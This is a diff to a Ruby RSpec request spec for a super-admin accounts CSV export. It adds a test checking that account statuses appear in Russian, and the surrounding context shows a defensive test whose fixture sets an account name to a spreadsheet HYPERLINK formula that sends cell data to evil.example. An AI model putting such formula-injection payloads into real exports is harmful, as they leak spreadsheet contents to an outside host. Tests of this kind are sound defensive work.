@@ -514,6 +514,20 @@ RSpec.describe 'Super Admin accounts API', locale: :en, type: :request do
     end
   end
 
+  describe 'GET /super_admin/accounts/export status column' do
+    it 'writes the status in Russian, the same one the list shows (на удаление before заблокирована)' do
+      create(:account, name: 'Заблокированная', status: :suspended)
+      create(:account, name: 'Уходящая', status: :suspended, custom_attributes: { 'marked_for_deletion_at' => 3.days.from_now.iso8601 })
+      sign_in(super_admin, scope: :super_admin)
+
+      get '/super_admin/accounts/export'
+
+      rows = CSV.parse(response.body.delete_prefix("﻿"), headers: true)
+      statuses = rows.to_h { |row| [row['Название'], row['Статус']] }
+      expect(statuses).to include(account.name => 'Активна', 'Заблокированная' => 'Заблокирована', 'Уходящая' => 'На удаление')
+    end
+  end
+
   describe 'GET /super_admin/accounts/export with hostile account names' do
     it 'stores formula-looking names as plain text' do
       account.update!(name: '=HYPERLINK("http://evil.example/?"&A1,"open")')
